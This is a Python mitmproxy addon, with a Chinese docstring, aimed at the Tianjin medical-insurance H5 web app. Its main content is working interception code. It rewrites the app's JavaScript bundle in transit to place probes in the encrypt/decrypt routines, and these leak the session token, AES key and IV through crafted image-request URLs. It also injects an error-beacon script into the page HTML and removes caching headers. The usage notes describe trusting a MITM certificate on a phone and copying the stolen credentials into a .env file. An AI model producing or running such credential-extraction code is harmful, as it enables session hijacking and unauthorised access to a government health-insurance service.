"""mitmdump addon: 津医保会话凭据探针.

原理: 津医保 H5 (https://jyt.ylbz.tj.gov.cn:4443/jyt-ui-prod/) 的主 bundle 在
common/util/request/jytPwd 模块中用会话级 aesKey/aesIv 做 AES-CBC 加解密。
本插件在该模块的 encrypt()/decrypt() 处注入探针, 页面发起首个加密请求时,
通过一张一次性图片请求把 token/aesKey/aesIv 回传到代理日志(kx_*.png, 404 无副作用)。

用法:
  mitmdump -p 8080 -s capture_addon.py -w flows.dump --set block_global=false
随后 iPhone 配置 Wi-Fi 代理指向本机:8080, 安装并信任 mitmproxy 证书,
打开津医保进入任意 H5 页面, 在本插件日志/flows 里找 kx_<token>_<key>_<iv>.png。

凭据同时写入 token 可直接填入 .env (JYB_TOKEN / JYB_AES_KEY / JYB_AES_IV)。
"""
import json
import time

from mitmproxy import http

OUT = "flows.jsonl"  # 相对 mitmdump 启动目录
MAX_BODY = 200_000

MAIN_JS = "index-87deb9eb16338ba2270b.js"
# encrypt() 锚点处于 var 声明列表, 注入必须是合法声明器 zz9=(...,0)
# 该作用域内 g=token, m=aesKey, y=aesIv 均可用
EXFIL_ENC = ('zz9=(new Image().src="https://jyt.ylbz.tj.gov.cn:4443/jyt-icon/kx_"'
             '+encodeURIComponent(g)+"_"+encodeURIComponent(m)+"_"+encodeURIComponent(y)+".png",0),')
EXFIL_DEC = ('zz8=(new Image().src="https://jyt.ylbz.tj.gov.cn:4443/jyt-icon/kx_"'
             '+encodeURIComponent(m)+"_"+encodeURIComponent(y)+".png",0),')
ANCHOR_ENC = "m=i.default.aesKey.get(),y=i.default.aesIv.get(),v=(Date.now()/1e3).toFixed()"
ANCHOR_DEC = "d=i.default.aesKey.get(),f=i.default.aesIv.get(),h=o.default.decrypt(r,d,f);"
ERRJS = ("<script>window.addEventListener('error',function(e){"
         "(new Image()).src='https://jyt.ylbz.tj.gov.cn:4443/jyt-icon/err_'+"
         "encodeURIComponent(String(e.message).slice(0,120))+'_'+(e.lineno||0)+'.png'},true);</script>")


def _clip(s):
    if s is None:
        return None
    if len(s) > MAX_BODY:
        return s[:MAX_BODY] + f"...[clipped {len(s) - MAX_BODY} chars]"
    return s


def response(flow: http.HTTPFlow) -> None:
    req, resp = flow.request, flow.response

    entry = {
        "ts": time.strftime("%H:%M:%S"),
        "method": req.method,
        "url": req.pretty_url,
        "req_headers": dict(req.headers),
        "req_body": _clip(req.get_text(strict=False)),
        "status": resp.status_code,
        "resp_content_type": resp.headers.get("content-type", ""),
        "resp_body": _clip(resp.get_text(strict=False)),
    }
    with open(OUT, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")

    url = req.pretty_url
    ctype = resp.headers.get("content-type", "")

    if MAIN_JS in url and "javascript" in ctype:
        t = resp.get_text(strict=False)
        if ANCHOR_ENC in t and ANCHOR_DEC in t:
            t = t.replace(ANCHOR_ENC, ANCHOR_ENC.replace(
                "y=i.default.aesIv.get(),", "y=i.default.aesIv.get()," + EXFIL_ENC))
            t = t.replace(ANCHOR_DEC, ANCHOR_DEC.replace(
                "f=i.default.aesIv.get(),", "f=i.default.aesIv.get()," + EXFIL_DEC))
            resp.set_text(t)
            resp.headers["cache-control"] = "no-store"
            resp.headers.pop("etag", None)
            resp.headers.pop("last-modified", None)
    elif "text/html" in ctype and "jyt.ylbz.tj.gov.cn" in req.pretty_host:
        t = resp.get_text(strict=False)
        if f"static/js/{MAIN_JS}" in t:
            t = t.replace(f"static/js/{MAIN_JS}", f"static/js/{MAIN_JS}?p=1")
            if "<head>" in t and "jyt-icon/err_" not in t:
                t = t.replace("<head>", "<head>" + ERRJS, 1)
            resp.set_text(t)
            resp.headers["cache-control"] = "no-store"
